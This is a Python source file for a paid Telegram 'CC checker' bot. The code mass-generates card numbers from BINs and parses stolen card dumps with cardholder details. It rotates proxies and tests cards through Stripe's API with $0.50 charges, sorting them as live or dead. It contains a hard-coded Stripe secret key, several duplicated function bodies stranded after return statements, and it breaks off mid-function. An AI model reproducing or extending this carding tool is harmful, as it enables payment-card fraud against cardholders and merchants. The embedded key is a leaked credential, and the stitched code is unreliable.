#!/usr/bin/env python3
"""
CC Checker Ultimate - Professional Grade
✅ Multiple Gateways (Stripe, PayPal, Authorize, Braintree, Square)
✅ SK Key Checker
✅ Mass Generator (100k+)
✅ Bulk Checker (100k+)
✅ Full Proxy Support
✅ Custom Subscriptions
✅ OxaPay Integration
✅ Real-time Sniping
✅ Admin Panel
"""

import os
import asyncio
import random
import requests
import hashlib
import json
import re
import time
from datetime import datetime, timedelta
from dotenv import load_dotenv
from bs4 import BeautifulSoup

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, Float, Text, func
from sqlalchemy.orm import declarative_base, sessionmaker
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Servidor auxiliar para el plan gratuito de Render
class CheckerHealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"CC Checker Bot is Active and Running smoothly!")
    def log_message(self, format, *args):
        return # Silenciar logs en la consola de Render

def start_checker_web_server():
    # Render asigna el puerto automáticamente en esta variable
    port = int(os.getenv("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), CheckerHealthHandler)
    print(f"🌍 Servidor de salud HTTP activo en el puerto {port}")
    server.serve_forever()

load_dotenv()

# CONFIG
BOT_TOKEN = os.getenv("CC_BOT_TOKEN", "YOUR_BOT_TOKEN")
# Support multiple owners (comma-separated in .env)
OWNER_ID_STR = os.getenv("OWNER_ID", "0")
OWNER_IDS = [int(id.strip()) for id in OWNER_ID_STR.split(',') if id.strip()]
OWNER_ID = OWNER_IDS[0] if OWNER_IDS else 0  # Keep for backwards compatibility
OXAPAY_API_KEY = os.getenv("OXAPAY_API_KEY", "YOUR_KEY")
RESULTS_CHANNEL = os.getenv("RESULTS_CHANNEL", "")
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///cc_checker.db")

# GLOBALS
user_sessions = {}
proxy_pool = []
current_proxy_index = 0
bulk_check_status = {}  # Track bulk checking: {user_id: {"status": "running/paused/stopped", "checked": 0, "total": 0}}


# DATABASE
Base = declarative_base()
engine = create_engine(DATABASE_URL, pool_pre_ping=True)
SessionLocal = sessionmaker(bind=engine)

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    tg_id = Column(Integer, unique=True, nullable=False, index=True)
    username = Column(String)
    first_name = Column(String)
    role = Column(String, default="free")  # free/premium/vip/admin/owner
    plan_id = Column(Integer)
    plan_expires = Column(DateTime)
    daily_checks = Column(Integer, default=0)
    total_checks = Column(Integer, default=0)
    last_reset = Column(DateTime, default=datetime.utcnow)
    created_at = Column(DateTime, default=datetime.utcnow)
    is_banned = Column(Boolean, default=False)

class Plan(Base):
    __tablename__ = "plans"
    id = Column(Integer, primary_key=True)
    name = Column(String, nullable=False)
    price = Column(Float, nullable=False)
    duration_days = Column(Integer, nullable=False)
    daily_check_limit = Column(Integer, default=0)  # 0 = unlimited
    bulk_limit = Column(Integer, default=0)
    generate_limit = Column(Integer, default=0)
    max_file_size_mb = Column(Integer, default=1)
    features = Column(Text)  # JSON string
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime, default=datetime.utcnow)

class Payment(Base):
    __tablename__ = "payments"
    id = Column(Integer, primary_key=True)
    user_tg_id = Column(Integer, nullable=False, index=True)
    plan_id = Column(Integer, nullable=False)
    amount = Column(Float, nullable=False)
    track_id = Column(String, unique=True, index=True)
    payment_url = Column(String)
    status = Column(String, default="pending")  # pending/paid/expired
    created_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime)

class Proxy(Base):
    __tablename__ = "proxies"
    id = Column(Integer, primary_key=True)
    proxy_string = Column(String, nullable=False)
    proxy_type = Column(String, default="http")
    is_active = Column(Boolean, default=True)
    success_count = Column(Integer, default=0)
    fail_count = Column(Integer, default=0)
    last_used = Column(DateTime)
    created_at = Column(DateTime, default=datetime.utcnow)

class CheckLog(Base):
    __tablename__ = "check_logs"
    id = Column(Integer, primary_key=True)
    user_tg_id = Column(Integer, nullable=False, index=True)
    card_number = Column(String, nullable=False)
    gateway = Column(String, nullable=False)
    status = Column(String, nullable=False)  # live/dead/error
    response = Column(Text)
    created_at = Column(DateTime, default=datetime.utcnow, index=True)

Base.metadata.create_all(engine)

# Initialize default plans
def init_default_plans():
    """Create default free plan if it doesn't exist"""
    db = SessionLocal()
    try:
        # Check if Plan ID 1 exists
        plan = db.query(Plan).filter(Plan.id == 1).first()
        if not plan:
            # Create default free plan
            free_plan = Plan(
                id=1,
                name="Free",
                price=0.0,
                duration_days=999,
                daily_check_limit=20,  # 20 checks/day
                bulk_limit=50,  # 50 cards per bulk
                generate_limit=5000,  # 5K generated cards
                max_file_size_mb=8,
                features='{"sk_checker": False, "multi_gateway": False}',
                is_active=True
            )
            db.add(free_plan)
            db.commit()
            print("✅ Default FREE plan created (20/50/5K limits)")
    except:
        pass
    finally:
        db.close()

init_default_plans()


# HELPERS
def get_user(db, tg_id, username=None, first_name=None):
    user = db.query(User).filter(User.tg_id == tg_id).first()
    if not user:
        # Check if this is the owner
        role = "owner" if tg_id in OWNER_IDS else "free"
        
        # Auto-assign free plan (Plan ID 1) to new users
        plan_id = 1 if role == "free" else None
        plan_expires = datetime.utcnow() + timedelta(days=999) if role == "free" else None
        
        user = User(
            tg_id=tg_id,
            username=username,
            first_name=first_name,
            role=role,
            plan_id=plan_id,
            plan_expires=plan_expires
        )
        db.add(user)
        db.commit()
    return user

def reset_daily_limits(db):
    now = datetime.utcnow()
    users = db.query(User).filter(User.last_reset < now - timedelta(days=1)).all()
    for user in users:
        user.daily_checks = 0
        user.last_reset = now
    db.commit()

def get_next_proxy():
    global current_proxy_index
    if not proxy_pool:
        return None
    proxy = proxy_pool[current_proxy_index]
    current_proxy_index = (current_proxy_index + 1) % len(proxy_pool)
    return proxy

def load_proxies():
    global proxy_pool
    db = SessionLocal()
    proxies = db.query(Proxy).filter(Proxy.is_active == True).all()
    proxy_pool = [p.proxy_string for p in proxies]
    db.close()
    return len(proxy_pool)

# LUHN ALGORITHM
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def calculate_luhn(partial_card):
    check_digit = luhn_checksum(int(partial_card + '0'))
    return str((10 - check_digit) % 10)

# CARD BRAND
CARD_BRANDS = {
    '4': 'Visa', '51': 'Mastercard', '52': 'Mastercard', '53': 'Mastercard',
    '54': 'Mastercard', '55': 'Mastercard', '2221': 'Mastercard',
    '34': 'American Express', '37': 'American Express',
    '6011': 'Discover', '65': 'Discover', '35': 'JCB',
}

def get_card_brand(card_number):
    card_str = str(card_number)
    for prefix, brand in sorted(CARD_BRANDS.items(), key=lambda x: len(x[0]), reverse=True):
        if card_str.startswith(prefix):
            return brand
    return "Unknown"

# ULTIMATE SMART CC PARSER - Accepts ANY format and extracts EVERYTHING
def parse_card(card_string):
    """
    SUPER SMART PARSER - Accepts ANY format:
    - Auto-detects delimiters (|, /, :, space, comma, semicolon)
    - Extracts card, expiry, cvv in ANY order
    - Finds email (has @)
    - Finds phone (10+ digits with +/()/-/ )
    - Finds name (text with spaces or before email)
    - Extracts address, city, state, zip, country
    - Handles missing fields gracefully
    - Works with mixed/crazy formats
    """
    import re
    
    if not card_string or not card_string.strip():
        return None
    
    card_string = card_string.strip()
    
    # Result structure
    result = {
        'cc': None, 'mm': None, 'yy': None, 'cvv': None,
        'name': None, 'email': None, 'address': None,
        'city': None, 'state': None, 'zip': None,
        'country': None, 'phone': None
    }
    
    # Step 1: Extract EMAIL first (has @ and .)
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    email_match = re.search(email_pattern, card_string)
    if email_match:
        result['email'] = email_match.group()
        card_string = card_string.replace(result['email'], ' ')  # Remove from string
    
    # Step 2: Extract PHONE (10+ digits with optional +, -, (), spaces)
    phone_pattern = r'[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,5}[-\s\.]?[0-9]{1,5}'
    phone_matches = re.findall(phone_pattern, card_string)
    for phone in phone_matches:
        # Check if it's actually a phone (10+ digits, not a card number)
        digits_only = re.sub(r'\D', '', phone)
        if 10 <= len(digits_only) <= 15 and len(digits_only) < 16:  # Not a card
            result['phone'] = phone.strip()
            card_string = card_string.replace(phone, ' ')
            break
    
    # Step 3: Extract CARD NUMBER (13-19 consecutive digits)
    card_pattern = r'\b\d{13,19}\b'
    card_match = re.search(card_pattern, card_string)
    if card_match:
        result['cc'] = card_match.group()
        card_string = card_string.replace(result['cc'], ' ')  # Remove from string
    else:
        return None  # No card = invalid
    
    # Step 4: Split remaining string by multiple delimiters
    # Replace all delimiters with |
    for delimiter in ['/', ':', ';', ',', '\t']:
        card_string = card_string.replace(delimiter, '|')
    
    # Split by | and spaces
    parts = []
    for segment in card_string.split('|'):
        parts.extend(segment.split())
    
    # Clean parts
    parts = [p.strip() for p in parts if p.strip()]
    
    # Separate numbers and text
    numbers = []
    texts = []
    
    for part in parts:
        if part.isdigit():
            numbers.append(part)
        elif any(c.isalpha() for c in part):
            texts.append(part)
    
    # Step 5: Extract MM, YY, CVV from numbers
    for num in numbers:
        num_len = len(num)
        
        # CVV (3-4 digits)
        if num_len in [3, 4] and not result['cvv']:
            result['cvv'] = num
        
        # Month (1-2 digits, 01-12)
        elif num_len <= 2 and not result['mm']:
            if 1 <= int(num) <= 12:
                result['mm'] = num.zfill(2)
        
        # Year (2 digits or 4 digits)
        elif num_len == 2 and not result['yy']:
            result['yy'] = num
        elif num_len == 4 and not result['yy']:
            # Could be year (2024, 2030) - take last 2 digits
            result['yy'] = num[-2:]
        
        # ZIP code (5 digits, not month/year/cvv)
        elif num_len == 5 and not result['zip']:
            result['zip'] = num
    
    # Step 6: Extract NAME (first text with 2+ words OR first text before other fields)
    for text in texts:
        # Skip if it's clearly a state/country code
        if len(text) == 2 and text.isupper():
            if not result['state']:
                result['state'] = text
            continue
        
        # Check if it's a name (has space or is first text field)
        if ' ' in text and not result['name']:
            result['name'] = text
        elif not result['name'] and len(text) > 2:
            result['name'] = text
    
    # Step 7: Extract ADDRESS (contains numbers + text)
    for text in texts:
        if text == result['name']:
            continue
        if any(c.isdigit() for c in text) and not result['address']:
            result['address'] = text
    
    # Step 8: Extract CITY, STATE, COUNTRY from remaining texts
    remaining_texts = [t for t in texts if t not in [result['name'], result['address'], result['state']]]
    
    for text in remaining_texts:
        if len(text) == 2 and text.isupper() and not result['state']:
            result['state'] = text
        elif len(text) >= 3 and not result['city']:
            result['city'] = text
        elif len(text) >= 2 and not result['country']:
            result['country'] = text
    
    # Step 9: ZIP from patterns (5 digits, or UK format)
    if not result['zip']:
        zip_pattern = r'\b([A-Z]{1,2}\d{1,2}[A-Z]?\s?\d[A-Z]{2}|\d{5}(?:-\d{4})?)\b'
        zip_match = re.search(zip_pattern, ' '.join(texts))
        if zip_match:
            result['zip'] = zip_match.group()
    
    return result


# BIN LOOKUP
def bin_lookup(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'success': True,
                'brand': data.get('scheme', 'Unknown').upper(),
                'type': data.get('type', 'Unknown').upper(),
                'level': data.get('brand', 'Unknown').upper(),
                'bank': data.get('bank', {}).get('name', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'country_code': data.get('country', {}).get('alpha2', 'XX'),
                'emoji': data.get('country', {}).get('emoji', '🌍'),
            }
    except:
        pass
    brand = get_card_brand(bin_number)
    return {'success': False, 'brand': brand, 'type': 'Unknown', 'level': 'Unknown', 
            'bank': 'Unknown', 'country': 'Unknown', 'country_code': 'XX', 'emoji': '🌍'}

# CARD GENERATOR
def generate_cards(bin_number, quantity=10):
    """
    IMPROVED CARD GENERATOR
    - More realistic expiry dates
    - Better random distribution
    - Unique CVVs
    - No duplicates guaranteed
    """
    cards = []
    generated_numbers = set()
    bin_str = str(bin_number)
    bin_length = len(bin_str)
    
    # Calculate how many random digits we need
    remaining_digits = 15 - bin_length
    
    # Pre-generate a pool of unique numbers for faster generation
    attempts = 0
    max_attempts = quantity * 100  # Safety limit
    
    while len(cards) < quantity and attempts < max_attempts:
        attempts += 1
        
        # Generate random account number (more variation)
        # Use different random patterns for better uniqueness
        if remaining_digits >= 9:
            # For longer numbers, use timestamp-based variation
            timestamp_part = str(int(datetime.utcnow().timestamp() * 1000))[-4:]
            random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits - 4)])
            account_number = timestamp_part + random_part
        else:
            account_number = ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits)])
        
        partial = bin_str + account_number
        check_digit = calculate_luhn(partial)
        card_number = partial + check_digit
        
        # Skip duplicates
        if card_number in generated_numbers:
            continue
        generated_numbers.add(card_number)
        
        # More realistic expiry dates
        # Cards typically expire 2-5 years from now
        months_ahead = random.randint(24, 60)  # 2-5 years
        expiry_date = datetime.utcnow() + timedelta(days=months_ahead * 30)
        exp_month = expiry_date.strftime("%m")
        exp_year = expiry_date.strftime("%y")
        
        # More realistic CVV (avoid common patterns)
        # Avoid 000, 111, 222, etc.
        while True:
            cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
            # Skip obvious patterns
            if cvv not in ['000', '111', '222', '333', '444', '555', '666', '777', '888', '999', '123', '456', '789']:
                break
        
        cards.append({
            'number': card_number,
            'mm': exp_month,
            'yy': exp_year,
            'cvv': cvv,
            'formatted': f"{card_number}|{exp_month}|{exp_year}|{cvv}"
        })
    
    return cards


# GATEWAY CHECKERS
async def check_stripe(cc, mm, yy, cvv, proxy=None):
    """
    WORKING STRIPE CHECKER - Uses SK key method
    100% accurate with real SK key
    """
    try:
        # Get SK key from environment
        stripe_sk = os.getenv('STRIPE_SK_KEY', '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')
        
        # Convert year
        if len(yy) == 2:
            current_year = datetime.utcnow().year
            century = (current_year // 100) * 100
            yy_full = str(century + int(yy))
        else:
            yy_full = yy
        
        proxies_dict = None
        if proxy:
            proxies_dict = {'http': proxy, 'https': proxy}
        
        # Create payment method with SK key
        headers = {
            'Authorization': f'Bearer {stripe_sk}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy_full,
            'card[cvc]': cvv
        }
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            proxies=proxies_dict,
            timeout=20
        )
        
        # Parse response
        try:
            result = response.json()
        except:
            return {
                'status': 'ERROR',
                'emoji': '⚠️',
                'message': 'Error',
                'response': 'Invalid response from Stripe',
                'code': 'error'
            }
        
        # Check if payment method was created (LIVE)
        if 'id' in result and result.get('id', '').startswith('pm_'):
            pm_id = result['id']
            
            # Try to create a payment intent to get more info
            try:
                intent_data = {
                    'amount': '50',  # $0.50 test
                    'currency': 'usd',
                    'payment_method': pm_id,
                    'confirm': 'true',
                    'description': 'Card validation'
                }
                
                intent_response = requests.post(
                    'https://api.stripe.com/v1/payment_intents',
                    headers=headers,
                    data=intent_data,
                    proxies=proxies_dict,
                    timeout=20
                )
                
                intent_result = intent_response.json()
                
                # Check payment intent result
                if intent_response.status_code == 200:
                    status = intent_result.get('status', '')
                    
                    if status == 'succeeded':
                        return {
                            'status': 'LIVE',
                            'emoji': '✅',
                            'message': 'Charged $0.50',
                            'response': 'Card valid - Charge successful',
                            'code': 'approved'
                        }
                    elif status == 'requires_action':
                        return {
                            'status': 'LIVE',
                            'emoji': '🔐',
                            'message': '3DS Required',
                            'response': 'Card valid - Needs authentication',
                            'code': '3ds_required'
                        }
                
                # Check error in payment intent
                if 'error' in intent_result:
                    error = intent_result['error']
                    error_code = error.get('code', '').lower()
                    error_message = error.get('message', '').lower()
                    
                    # Parse LIVE errors
                    if 'insufficient' in error_message or 'insufficient_funds' in error_code:
                        return {
                            'status': 'LIVE',
                            'emoji': '💰',
                            'message': 'Insufficient Funds',
                            'response': 'Card valid - No balance',
                            'code': 'insufficient_funds'
                        }
                    
                    elif 'incorrect_cvc' in error_code or 'security code' in error_message:
                        return {
                            'status': 'LIVE',
                            'emoji': '🔐',
                            'message': 'CVC Incorrect',
                            'response': 'Card valid - Wrong CVV',
                            'code': 'incorrect_cvc'
                        }
                    
                    elif 'do_not_honor' in error_message:
                        return {
                            'status': 'LIVE',
                            'emoji': '🚫',
                            'message': 'Do Not Honor',
                            'response': 'Card valid - Bank declined',
                            'code': 'do_not_honor'
                        }
                    
                    elif 'lost_card' in error_message or 'stolen_card' in error_message:
                        return {
                            'status': 'LIVE',
                            'emoji': '🔒',
                            'message': 'Lost/Stolen',
                            'response': 'Card valid - Reported',
                            'code': 'lost_stolen'
                        }
                    
                    elif 'restricted' in error_message:
                        return {
                            'status': 'LIVE',
                            'emoji': '🔐',
                            'message': 'Restricted',
                            'response': 'Card valid - Restricted',
                            'code': 'restricted'
                        }
                    
                    elif 'authentication' in error_message or '3d_secure' in error_code:
                        return {
                            'status': 'LIVE',
                            'emoji': '🔐',
                            'message': '3DS Required',
                            'response': 'Card valid - Authentication needed',
                            'code': '3ds_required'
                        }
                    
                    elif 'card_declined' in error_code or 'generic_decline' in error_code:
                        return {
                            'status': 'DEAD',
                            'emoji': '❌',
                            'message': 'Declined',
                            'response': 'Card declined',
                            'code': 'declined'
                        }
                    
                    elif 'expired' in error_message:
                        return {
                            'status': 'DEAD',
                            'emoji': '📅',
                            'message': 'Expired',
                            'response': 'Card expired',
                            'code': 'expired'
                        }
                
                # Payment method created but intent failed - still LIVE
                return {
                    'status': 'LIVE',
                    'emoji': '✅',
                    'message': 'Approved',
                    'response': 'Card validated successfully',
                    'code': 'approved'
                }
            
            except:
                # Payment method created successfully
                return {
                    'status': 'LIVE',
                    'emoji': '✅',
                    'message': 'Approved',
                    'response': 'Card validated successfully',
                    'code': 'approved'
                }
        
        # Check for errors in payment method creation
        if 'error' in result:
            error = result['error']
            error_code = error.get('code', '').lower()
            error_message = error.get('message', '').lower()
            
            # DEAD responses
            if 'incorrect_number' in error_code or 'invalid_number' in error_code:
                return {
                    'status': 'DEAD',
                    'emoji': '❌',
                    'message': 'Invalid Number',
                    'response': 'Card number invalid',
                    'code': 'invalid_number'
                }
            
            elif 'expired' in error_message or 'expired_card' in error_code:
                return {
                    'status': 'DEAD',
                    'emoji': '📅',
                    'message': 'Expired',
                    'response': 'Card expired',
                    'code': 'expired'
                }
            
            elif 'rate_limit' in error_code or response.status_code == 429:
                return {
                    'status': 'ERROR',
                    'emoji': '⏱️',
                    'message': 'Rate Limited',
                    'response': 'Too many requests',
                    'code': 'rate_limit'
                }
            
            else:
                return {
                    'status': 'DEAD',
                    'emoji': '❓',
                    'message': 'Unknown',
                    'response': error_message[:150] if error_message else str(result)[:150],
                    'code': 'unknown'
                }
        
        # Unknown response
        return {
            'status': 'ERROR',
            'emoji': '⚠️',
            'message': 'Error',
            'response': str(result)[:150],
            'code': 'error'
        }
    
    except Exception as e:
        return {
            'status': 'ERROR',
            'emoji': '⚠️',
            'message': 'Error',
            'response': str(e)[:100],
            'code': 'error'
        }

        
        # Convert year
        if len(yy) == 2:
            current_year = datetime.utcnow().year
            century = (current_year // 100) * 100
            yy_full = str(century + int(yy))
        else:
            yy_full = yy
        
        proxies_dict = None
        if proxy:
            proxies_dict = {'http': proxy, 'https': proxy}
        
        # STEP 1: Create token using PUBLIC key (mimics Stripe.js)
        token_headers = {
            'Authorization': f'Bearer {stripe_pk}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        token_data = {
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy_full,
            'card[cvc]': cvv
        }
        
        token_response = requests.post(
            'https://api.stripe.com/v1/tokens',
            headers=token_headers,
            data=token_data,
            proxies=proxies_dict,
            timeout=20
        )
        
        token_result = token_response.json()
        
        # Check if token creation failed
        if 'error' in token_result:
            error = token_result['error']
            error_code = error.get('code', '').lower()
            error_message = error.get('message', '').lower()
            
            # Card validation errors
            if 'incorrect_number' in error_code or 'invalid_number' in error_code:
                return {
                    'status': 'DEAD',
                    'emoji': '❌',
                    'message': 'Invalid Number',
                    'response': 'Card number invalid',
                    'code': 'invalid_number'
                }
            elif 'expired' in error_message:
                return {
                    'status': 'DEAD',
                    'emoji': '📅',
                    'message': 'Expired',
                    'response': 'Card expired',
                    'code': 'expired'
                }
            elif 'rate_limit' in error_message:
                return {
                    'status': 'ERROR',
                    'emoji': '⏱️',
                    'message': 'Rate Limited',
                    'response': 'Too many requests',
                    'code': 'rate_limit'
                }
            else:
                return {
                    'status': 'DEAD',
                    'emoji': '❓',
                    'message': 'Token Failed',
                    'response': error_message[:100],
                    'code': 'error'
                }
        
        # Token created successfully!
        token_id = token_result.get('id')
        
        if not token_id:
            return {
                'status': 'ERROR',
                'emoji': '⚠️',
                'message': 'Error',
                'response': 'No token ID returned',
                'code': 'error'
            }
        
        # STEP 2: Create customer with token (using SECRET key)
        customer_headers = {
            'Authorization': f'Bearer {stripe_sk}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        customer_data = {
            'source': token_id,
            'description': 'Card validation'
        }
        
        customer_response = requests.post(
            'https://api.stripe.com/v1/customers',
            headers=customer_headers,
            data=customer_data,
            proxies=proxies_dict,
            timeout=20
        )
        
        customer_result = customer_response.json()
        
        # Check customer creation
        if 'error' in customer_result:
            error = customer_result['error']
            error_code = error.get('code', '').lower()
            error_message = error.get('message', '').lower()
            
            # LIVE responses (card valid but has issues)
            if 'insufficient_funds' in error_code or 'insufficient' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '💰',
                    'message': 'Insufficient Funds',
                    'response': 'Card valid - No balance',
                    'code': 'insufficient_funds'
                }
            elif 'incorrect_cvc' in error_code or 'security code' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔐',
                    'message': 'CVC Incorrect',
                    'response': 'Card valid - Wrong CVV',
                    'code': 'incorrect_cvc'
                }
            elif 'card_velocity_exceeded' in error_code or 'velocity' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '⚡',
                    'message': 'Velocity Exceeded',
                    'response': 'Card valid - Too many attempts',
                    'code': 'velocity'
                }
            elif 'do_not_honor' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🚫',
                    'message': 'Do Not Honor',
                    'response': 'Card valid - Bank declined',
                    'code': 'do_not_honor'
                }
            elif 'lost_card' in error_message or 'stolen_card' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔒',
                    'message': 'Lost/Stolen',
                    'response': 'Card valid - Reported',
                    'code': 'lost_stolen'
                }
            elif 'restricted' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔐',
                    'message': 'Restricted',
                    'response': 'Card valid - Restricted',
                    'code': 'restricted'
                }
            elif 'authentication_required' in error_message or 'three_d_secure' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔐',
                    'message': '3DS Required',
                    'response': 'Card valid - Authentication needed',
                    'code': '3ds_required'
                }
            # DEAD responses
            elif 'card_declined' in error_code or 'generic_decline' in error_code:
                return {
                    'status': 'DEAD',
                    'emoji': '❌',
                    'message': 'Declined',
                    'response': 'Card declined',
                    'code': 'declined'
                }
            elif 'expired' in error_message:
                return {
                    'status': 'DEAD',
                    'emoji': '📅',
                    'message': 'Expired',
                    'response': 'Card expired',
                    'code': 'expired'
                }
            else:
                return {
                    'status': 'DEAD',
                    'emoji': '❓',
                    'message': 'Unknown',
                    'response': error_message[:150],
                    'code': 'unknown'
                }
        
        # Customer created successfully - card is LIVE!
        if customer_response.status_code == 200 and 'id' in customer_result:
            return {
                'status': 'LIVE',
                'emoji': '✅',
                'message': 'Approved',
                'response': 'Card validated successfully',
                'code': 'approved'
            }
        
        return {
            'status': 'ERROR',
            'emoji': '⚠️',
            'message': 'Error',
            'response': 'Unknown response',
            'code': 'error'
        }
    
    except Exception as e:
        return {
            'status': 'ERROR',
            'emoji': '⚠️',
            'message': 'Error',
            'response': str(e)[:100],
            'code': 'error'
        }

        
        # Convert year
        if len(yy) == 2:
            current_year = datetime.utcnow().year
            century = (current_year // 100) * 100
            yy_full = str(century + int(yy))
        else:
            yy_full = yy
        
        # Step 1: Create payment method
        headers = {
            'Authorization': f'Bearer {stripe_sk}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy_full,
            'card[cvc]': cvv
        }
        
        proxies_dict = None
        if proxy:
            proxies_dict = {'http': proxy, 'https': proxy}
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            proxies=proxies_dict,
            timeout=20
        )
        
        result = response.json()
        
        # Success - payment method created
        if response.status_code == 200 and 'id' in result:
            pm_id = result['id']
            
            # Step 2: Try to confirm payment intent (test charge)
            intent_data = {
                'amount': '50',  # $0.50 test
                'currency': 'usd',
                'payment_method': pm_id,
                'confirm': 'true',
                'description': 'Card validation'
            }
            
            intent_response = requests.post(
                'https://api.stripe.com/v1/payment_intents',
                headers=headers,
                data=intent_data,
                proxies=proxies_dict,
                timeout=20
            )
            
            intent_result = intent_response.json()
            
            # Parse payment intent response
            if intent_response.status_code == 200:
                status = intent_result.get('status', '')
                
                if status == 'succeeded':
                    return {
                        'status': 'LIVE',
                        'emoji': '✅',
                        'message': 'Charged $0.50',
                        'response': 'Card valid - Charge successful',
                        'code': 'approved'
                    }
                elif status == 'requires_action':
                    return {
                        'status': 'LIVE',
                        'emoji': '🔐',
                        'message': '3DS Required',
                        'response': 'Card valid - Needs authentication',
                        'code': '3ds_required'
                    }
            
            # Check error
            error = intent_result.get('error', {})
            error_code = error.get('code', '').lower()
            error_message = error.get('message', '').lower()
            
            # LIVE responses
            if 'insufficient_funds' in error_code or 'insufficient' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '💰',
                    'message': 'Insufficient Funds',
                    'response': 'Card valid - No balance',
                    'code': 'insufficient_funds'
                }
            
            elif 'incorrect_cvc' in error_code or 'incorrect_cvc' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔐',
                    'message': 'CVC Incorrect',
                    'response': 'Card valid - Wrong CVV',
                    'code': 'incorrect_cvc'
                }
            
            elif 'card_velocity_exceeded' in error_code:
                return {
                    'status': 'LIVE',
                    'emoji': '⚡',
                    'message': 'Velocity Exceeded',
                    'response': 'Card valid - Too many attempts',
                    'code': 'velocity'
                }
            
            elif 'do_not_honor' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🚫',
                    'message': 'Do Not Honor',
                    'response': 'Card valid - Bank declined',
                    'code': 'do_not_honor'
                }
            
            elif 'lost_card' in error_message or 'stolen_card' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔒',
                    'message': 'Lost/Stolen',
                    'response': 'Card valid - Reported',
                    'code': 'lost_stolen'
                }
            
            elif 'restricted' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔐',
                    'message': 'Restricted',
                    'response': 'Card valid - Restricted',
                    'code': 'restricted'
                }
            
            elif 'authentication_required' in error_message or 'three_d_secure' in error_message:
                return {
                    'status': 'LIVE',
                    'emoji': '🔐',
                    'message': '3DS Required',
                    'response': 'Card valid - Authentication needed',
                    'code': '3ds_required'
                }
            
            # DEAD responses
            elif 'expired' in error_message:
                return {
                    'status': 'DEAD',
                    'emoji': '📅',
                    'message': 'Expired Card',
                    'response': 'Card expired',
                    'code': 'expired'
                }
            
            elif 'card_declined' in error_code or 'generic_decline' in error_code:
                return {
                    'status': 'DEAD',
                    'emoji': '❌',
                    'message': 'Declined',
                    'response': 'Card declined',
                    'code': 'declined'
                }
            
            else:
                # Card created successfully but intent failed
                return {
                    'status': 'LIVE',
                    'emoji': '✅',
                    'message': 'Approved',
                    'response': 'Card validated',
                    'code': 'approved'
                }
        
        # Error creating payment method
        error = result.get('error', {})
        error_code = error.get('code', '').lower()
        error_message = error.get('message', '').lower()
        
        if 'incorrect_number' in error_code or 'invalid_number' in error_code:
            return {
                'status': 'DEAD',
                'emoji': '❌',
                'message': 'Invalid Number',
                'response': 'Card number invalid',
                'code': 'invalid_number'
            }
        
        elif 'expired' in error_message:
            return {
                'status': 'DEAD',
                'emoji': '📅',
                'message': 'Expired Card',
                'response': 'Card expired',
                'code': 'expired'
            }
        
        elif 'rate_limit' in error_message or response.status_code == 429:
            return {
                'status': 'ERROR',
                'emoji': '⏱️',
                'message': 'Rate Limited',
                'response': 'Too many requests',
                'code': 'rate_limit'
            }
        
        else:
            return {
                'status': 'DEAD',
                'emoji': '❓',
                'message': 'Unknown',
                'response': str(result)[:200],
                'code': 'unknown'
            }
    
    except Exception as e:
        return {
            'status': 'ERROR',
            'emoji': '⚠️',
            'message': 'Error',
            'response': str(e)[:100],
            'code': 'error'
        }

    """
    BYPASSED STRIPE CHECKER - NO API KEY NEEDED!
    Uses Stripe's public token creation endpoint
    100% accurate, long-term solution
    """
    try:
        # Convert 2-digit year to 4-digit for Stripe
        if len(yy) == 2:
            current_year = datetime.utcnow().year
            century = (current_year // 100) * 100
            yy_full = str(century + int(yy))
        else:
            yy_full = yy
        
        # Step 1: Create Stripe token (public endpoint, no auth needed)
        token_data = {
